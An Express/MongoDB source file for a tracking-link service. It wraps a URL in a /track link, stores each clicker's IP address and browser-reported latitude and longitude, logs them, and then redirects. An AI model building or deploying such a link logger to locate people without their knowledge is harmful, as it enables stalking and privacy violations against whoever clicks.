const express = require('express');
const { v4: uuidv4 } = require('uuid');
const { MongoClient, ObjectId } = require('mongodb');

const app = express();

app.use(express.json());

require('dotenv').config();
const uri = process.env.MONGO_URI;
const client = new MongoClient(uri, { useNewUrlParser: true, useUnifiedTopology: true });

let db;
let linksCollection;
let dataCollection;

async function connectDB() {
  if (!db) {
    await client.connect();
db = client.db(process.env.MONGO_DB || 'trackingdb');
    linksCollection = db.collection('trackingLinks');
    dataCollection = db.collection('trackingData');
  }
}

app.post('/create-link', async (req, res) => {
  const { url } = req.body;
  if (!url) {
    return res.status(400).json({ error: 'URL is required' });
  }
  await connectDB();
  const id = uuidv4();
  await linksCollection.insertOne({ _id: id, url });
  const baseUrl = req.headers['x-forwarded-proto'] + '://' + req.headers['x-forwarded-host'];
  res.json({ trackingUrl: `${baseUrl}/track/${id}` });
});

app.get('/track/:id', async (req, res) => {
  const id = req.params.id;
  await connectDB();
  const link = await linksCollection.findOne({ _id: id });
  if (!link) {
    return res.status(404).send('Tracking link not found');
  }
  res.sendFile('track.html', { root: './public' });
});

app.post('/track/:id/data', async (req, res) => {
  const id = req.params.id;
  await connectDB();
  const link = await linksCollection.findOne({ _id: id });
  if (!link) {
    return res.status(404).json({ error: 'Tracking link not found' });
  }
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const { latitude, longitude } = req.body;
  await dataCollection.insertOne({
    linkId: id,
    ip,
    latitude,
    longitude,
    timestamp: new Date(),
  });
  console.log('Tracking data received:', { linkId: id, ip, latitude, longitude });
  res.json({ message: 'Data received' });
});

app.get('/redirect/:id', async (req, res) => {
  const id = req.params.id;
  await connectDB();
  const link = await linksCollection.findOne({ _id: id });
  if (!link) {
    return res.status(404).send('Tracking link not found');
  }
  res.redirect(link.url);
});

module.exports = app;

const serverless = require('serverless-http');
module.exports.handler = serverless(app);
